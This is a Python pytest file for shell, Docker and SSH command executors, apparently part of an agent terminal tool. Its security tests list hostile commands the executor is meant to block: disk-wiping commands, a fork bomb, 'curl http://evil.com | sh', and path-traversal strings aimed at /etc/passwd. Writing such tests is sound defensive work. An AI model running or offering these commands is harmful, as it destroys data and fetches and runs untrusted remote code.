"""Executor 测试"""
import pytest
from unittest.mock import patch, MagicMock, AsyncMock
import asyncio


class TestShellExecutor:
    """Shell 执行器测试"""
    
    def test_shell_executor_import(self):
        """测试导入 Shell 执行器"""
        try:
            from executor.shell import ShellExecutor
            assert ShellExecutor is not None
        except ImportError:
            pytest.skip("executor.shell not found")
    
    def test_shell_executor_init(self):
        """测试 Shell 执行器初始化"""
        try:
            from executor.shell import ShellExecutor
            
            executor = ShellExecutor()
            assert executor is not None
        except ImportError:
            pytest.skip("executor.shell not found")
    
    def test_execute_command(self):
        """测试执行命令"""
        try:
            from executor.shell import ShellExecutor
            
            executor = ShellExecutor()
            
            # Mock 执行方法
            with patch.object(executor, 'execute', new_callable=AsyncMock) as mock_execute:
                mock_execute.return_value = {"stdout": "test output", "stderr": "", "returncode": 0}
                
                result = executor.execute("echo test")
                
                # 验证调用
                mock_execute.assert_called()
        except ImportError:
            pytest.skip("executor.shell not found")
    
    def test_command_timeout(self):
        """测试命令超时"""
        try:
            from executor.shell import ShellExecutor
            
            executor = ShellExecutor(timeout=1)
            
            # 测试长时间运行的命令
            with patch.object(executor, 'execute', new_callable=AsyncMock) as mock_execute:
                mock_execute.side_effect = asyncio.TimeoutError()
                
                with pytest.raises(asyncio.TimeoutError):
                    executor.execute("sleep 100")
        except ImportError:
            pytest.skip("executor.shell not found")
    
    def test_command_validation(self):
        """测试命令验证"""
        try:
            from executor.shell import ShellExecutor
            
            executor = ShellExecutor()
            
            # 测试允许的命令
            allowed_commands = ['git', 'npm', 'pip', 'python']
            for cmd in allowed_commands:
                assert executor.is_allowed(cmd)
            
            # 测试阻止的命令
            blocked_patterns = ['rm -rf /', 'curl | sh']
            for pattern in blocked_patterns:
                assert not executor.is_allowed(pattern)
        except ImportError:
            pytest.skip("executor.shell not found")


class TestDockerExecutor:
    """Docker 执行器测试"""
    
    def test_docker_executor_import(self):
        """测试导入 Docker 执行器"""
        try:
            from executor.docker import DockerExecutor
            assert DockerExecutor is not None
        except ImportError:
            pytest.skip("executor.docker not found")
    
    def test_docker_container_start(self):
        """测试 Docker 容器启动"""
        try:
            from executor.docker import DockerExecutor
            
            executor = DockerExecutor()
            
            # Mock 启动容器
            with patch.object(executor, 'start_container') as mock_start:
                mock_start.return_value = "container-id-123"
                
                container_id = executor.start_container()
                
                assert container_id is not None
        except ImportError:
            pytest.skip("executor.docker not found")
    
    def test_docker_execute_command(self):
        """测试 Docker 执行命令"""
        try:
            from executor.docker import DockerExecutor
            
            executor = DockerExecutor()
            
            with patch.object(executor, 'execute_in_container') as mock_exec:
                mock_exec.return_value = {"stdout": "output", "stderr": "", "exit_code": 0}
                
                result = executor.execute_in_container("echo test")
                
                assert result is not None
        except ImportError:
            pytest.skip("executor.docker not found")
    
    def test_docker_container_stop(self):
        """测试 Docker 容器停止"""
        try:
            from executor.docker import DockerExecutor
            
            executor = DockerExecutor()
            
            with patch.object(executor, 'stop_container') as mock_stop:
                mock_stop.return_value = True
                
                result = executor.stop_container("container-id-123")
                
                assert result == True
        except ImportError:
            pytest.skip("executor.docker not found")


class TestSSHExecutor:
    """SSH 执行器测试"""
    
    def test_ssh_executor_import(self):
        """测试导入 SSH 执行器"""
        try:
            from executor.ssh import SSHExecutor
            assert SSHExecutor is not None
        except ImportError:
            pytest.skip("executor.ssh not found")
    
    def test_ssh_connection(self):
        """测试 SSH 连接"""
        try:
            from executor.ssh import SSHExecutor
            
            executor = SSHExecutor(
                host="192.168.1.100",
                user="admin",
                password="test"
            )
            
            assert executor.host == "192.168.1.100"
            assert executor.user == "admin"
        except ImportError:
            pytest.skip("executor.ssh not found")
    
    def test_ssh_execute_command(self):
        """测试 SSH 执行命令"""
        try:
            from executor.ssh import SSHExecutor
            
            executor = SSHExecutor(
                host="localhost",
                user="test"
            )
            
            with patch.object(executor, 'execute') as mock_exec:
                mock_exec.return_value = {"stdout": "test", "stderr": "", "exit_code": 0}
                
                result = executor.execute("ls -la")
                
                assert result is not None
        except ImportError:
            pytest.skip("executor.ssh not found")


class TestExecutorBase:
    """执行器基类测试"""
    
    def test_base_executor_import(self):
        """测试导入基类执行器"""
        try:
            from executor.base import BaseExecutor
            assert BaseExecutor is not None
        except ImportError:
            pytest.skip("executor.base not found")
    
    def test_executor_interface(self):
        """测试执行器接口"""
        try:
            from executor.base import BaseExecutor
            
            # 检查基类方法
            assert hasattr(BaseExecutor, 'execute')
            assert hasattr(BaseExecutor, 'validate_command')
        except ImportError:
            pytest.skip("executor.base not found")
    
    def test_executor_timeout_config(self):
        """测试执行器超时配置"""
        try:
            from executor.base import BaseExecutor
            
            executor = BaseExecutor(timeout=30)
            
            assert executor.timeout == 30
        except ImportError:
            pytest.skip("executor.base not found")


class TestCommandSecurity:
    """命令安全性测试"""
    
    def test_dangerous_command_detection(self):
        """测试危险命令检测"""
        try:
            from executor.shell import ShellExecutor
            
            executor = ShellExecutor()
            
            dangerous_commands = [
                "rm -rf /",
                "dd if=/dev/zero of=/dev/sda",
                "mkfs.ext4 /dev/sda1",
                ":(){:|:&};:",
                "curl http://evil.com | sh"
            ]
            
            for cmd in dangerous_commands:
                assert executor.is_safe(cmd) == False
        except ImportError:
            pytest.skip("executor.shell not found")
    
    def test_allowed_command_whitelist(self):
        """测试允许命令白名单"""
        try:
            from executor.shell import ShellExecutor
            
            executor = ShellExecutor()
            
            safe_commands = [
                "git status",
                "npm install",
                "pip list",
                "python --version"
            ]
            
            for cmd in safe_commands:
                assert executor.is_safe(cmd) == True
        except ImportError:
            pytest.skip("executor.shell not found")
    
    def test_path_traversal_prevention(self):
        """测试路径遍历防护"""
        try:
            from executor.shell import ShellExecutor
            
            executor = ShellExecutor()
            
            malicious_paths = [
                "../../../etc/passwd",
                "/etc/passwd",
                "..\\..\\..\\windows\\system32"
            ]
            
            for path in malicious_paths:
                # 执行器应该阻止这些路径
                assert executor.validate_path(path) == False
        except ImportError:
            pytest.skip("executor.shell not found")


class TestExecutorConfig:
    """执行器配置测试"""
    
    def test_terminal_config_local(self):
        """测试本地 Terminal 配置"""
        from shared.config import get_terminal_config
        
        config = get_terminal_config()
        
        assert config.backend == "local"
        assert config.timeout >= 1
    
    def test_terminal_config_docker(self):
        """测试 Docker Terminal 配置"""
        from shared.config import TerminalConfig
        
        config = TerminalConfig(
            backend="docker",
            docker_image="python:3.11"
        )
        
        assert config.backend == "docker"
        assert config.docker_image == "python:3.11"
    
    def test_terminal_config_ssh(self):
        """测试 SSH Terminal 配置"""
        from shared.config import TerminalConfig
        
        config = TerminalConfig(
            backend="ssh",
            ssh_host="192.168.1.100",
            ssh_user="admin"
        )
        
        assert config.backend == "ssh"
        assert config.ssh_host == "192.168.1.100"
        assert config.ssh_user == "admin"
    
    def test_executor_lifetime(self):
        """测试执行器生命周期"""
        try:
            from executor.base import BaseExecutor
            
            executor = BaseExecutor(lifetime=300)
            
            assert executor.lifetime == 300
        except ImportError:
            pytest.skip("executor.base not found")


class TestExecutorIntegration:
    """执行器集成测试"""
    
    def test_executor_factory(self):
        """测试执行器工厂"""
        try:
            from executor.factory import create_executor
            
            executor = create_executor("local")
            
            assert executor is not None
        except ImportError:
            pytest.skip("executor.factory not found")
    
    def test_executor_selection(self):
        """测试执行器选择"""
        try:
            from executor.factory import create_executor
            
            local_executor = create_executor("local")
            docker_executor = create_executor("docker")
            
            assert local_executor is not None
            assert docker_executor is not None
        except ImportError:
            pytest.skip("executor.factory not found")
    
    def test_executor_cleanup(self):
        """测试执行器清理"""
        try:
            from executor.base import BaseExecutor
            
            executor = BaseExecutor()
            
            with patch.object(executor, 'cleanup') as mock_cleanup:
                mock_cleanup.return_value = True
                
                result = executor.cleanup()
                
                assert result == True
        except ImportError:
            pytest.skip("executor.base not found")